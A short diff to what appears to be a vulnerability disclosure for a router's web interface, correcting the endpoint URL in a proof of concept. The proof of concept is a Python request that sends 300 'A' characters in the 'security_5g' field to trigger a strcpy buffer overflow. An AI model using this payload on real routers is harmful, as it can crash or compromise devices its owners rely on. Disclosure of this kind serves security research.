@@ -27,7 +27,7 @@ if we dont send all paremeters, get into else, call strcpy, cause buff overflow
 
 ## POC
 ```
-url = "http://192.168.1.13/goform/formWifiBasicSet"
+url = "http://192.168.1.13/goform/WifiBasicSet"
 payload = 'A'*300 + '\n'
 
 r = requests.post(url, data={'security_5g': payload})
